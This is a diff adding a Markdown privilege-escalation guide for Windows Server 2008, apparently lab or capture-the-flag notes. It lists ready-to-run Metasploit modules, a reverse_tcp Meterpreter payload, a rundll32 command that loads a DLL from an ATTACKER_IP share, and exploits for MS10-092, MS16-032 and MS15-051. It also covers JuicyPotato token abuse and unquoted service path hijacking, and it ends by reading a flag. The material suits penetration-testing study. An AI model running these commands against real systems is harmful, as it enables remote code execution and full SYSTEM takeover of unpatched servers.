@@ -3854,3 +3854,194 @@ These can be cracked or used for pass-the-hash attacks.
 
 ---
 
+# 🧰 Windows Server 2008 Privilege Escalation 
+
+## 📌 Overview
+
+Windows Server 2008 / 2008 R2 is an end-of-life operating system (EOL: Jan 14, 2020).
+It lacks modern security features found in Server 2016–2022, making it highly susceptible to:
+
+* LPE via old kernel bugs
+* Task Scheduler .XML attacks (MS10-092)
+* ClientCopyImage (MS15-051)
+* Secondary Logon Handle PrivEsc (MS16-032)
+* Token impersonation
+* Insecure service permissions
+* Unquoted service paths
+* Missing patches enumerated via scripts (Sherlock, WinExploitSuggest)
+
+## 1. 🕵️ Enumeration
+
+### 1.1 Check Patch Level (WMI)
+
+```cmd
+wmic qfe
+```
+
+* Look for last installed KB
+* If extremely outdated → likely vulnerable to multiple LPEs
+
+### 1.2 Collect System Information
+
+```cmd
+systeminfo
+whoami /priv
+whoami /groups
+hostname
+net users
+net localgroup administrators
+```
+
+
+### 1.3 Run Sherlock
+
+```powershell
+Set-ExecutionPolicy Bypass -Scope Process -Force
+Import-Module .\Sherlock.ps1
+Find-AllVulns
+```
+
+Important vulns to look for:
+
+| Vuln     | CVE           | Patch                  | Notes                   |
+| -------- | ------------- | ---------------------- | ----------------------- |
+| MS10-092 | CVE-2010-3338 | Task Scheduler XML     | Very reliable           |
+| MS15-051 | CVE-2015-1701 | ClientCopyImage        | Reliable on 2008 R2 x64 |
+| MS16-032 | CVE-2016-0099 | Secondary Logon Handle | Very stable             |
+| MS10-015 | CVE-2010-0232 | KiTrap0D               | 32-bit only             |
+
+
+
+### 1.4 Windows-Exploit-Suggester
+
+Generate DB:
+
+```bash
+python windows-exploit-suggester.py --update
+```
+
+Use systeminfo output:
+
+```bash
+windows-exploit-suggester.py --database <db.xls> --systeminfo sysinfo.txt
+```
+
+
+## 2. 📡 Gaining Initial Access (Example Used)
+
+Using smb_delivery:
+
+```msf
+use exploit/windows/smb/smb_delivery
+set payload windows/meterpreter/reverse_tcp
+set SRVHOST <attacker>
+set LHOST <attacker>
+exploit
+```
+
+Execute on target:
+
+```cmd
+rundll32.exe \\ATTACKER_IP\SHARE\file.dll,0
+```
+
+## 3. 🚀 Privilege Escalation Methods
+
+Below are **multiple possible paths** (pick at least 1 for your lab).
+
+
+### **Method 1 – MS10-092 Task Scheduler XML LPE** (Reliable)
+
+**If Sherlock says `Appears Vulnerable`:**
+
+```msf
+use exploit/windows/local/ms10_092_schelevator
+set SESSION 1
+set LHOST <attacker>
+set LPORT 4443
+exploit
+```
+
+Successful result:
+
+```
+Server username: NT AUTHORITY\SYSTEM
+```
+
+
+
+### **Method 2 – MS16-032 (Secondary Logon Handle LPE)**
+
+Works extremely well on Windows 7 / 2008 R2.
+
+Manual PowerShell exploit:
+
+```powershell
+powershell.exe -exec bypass
+. .\Invoke-MS16032.ps1
+Invoke-MS16032 -Command "cmd /c whoami > C:\temp\out.txt"
+```
+
+
+
+### **Method 3 – MS15-051 (ClientCopyImage PrivEsc)**
+
+If Sherlock says `Appears Vulnerable`:
+Use Metasploit:
+
+```msf
+use exploit/windows/local/ms15_051_client_copy_image
+set SESSION 1
+set LHOST <attacker>
+exploit
+```
+
+
+
+### **Method 4 – Token Impersonation (If you find SeImpersonatePrivilege)**
+
+Check:
+
+```cmd
+whoami /priv
+```
+
+If enabled → use JuicyPotato / RoguePotato:
+
+Example:
+
+```cmd
+JuicyPotato.exe -t * -p cmd.exe -l 9999
+```
+
+
+### **Method 5 – Unquoted Service Path**
+
+Enumerate:
+
+```cmd
+wmic service get name,pathname,startmode
+```
+
+If unquoted path:
+Insert malicious exe at writable location → restart service → SYSTEM.
+
+
+## 4. 🏁 Post-Exploitation
+
+### 4.1 Confirm SYSTEM
+
+```cmd
+whoami
+whoami /groups
+```
+
+### 4.2 Grab Flag
+
+```cmd
+type C:\Users\Administrator\Desktop\flag.txt
+```
+
+---
+
+
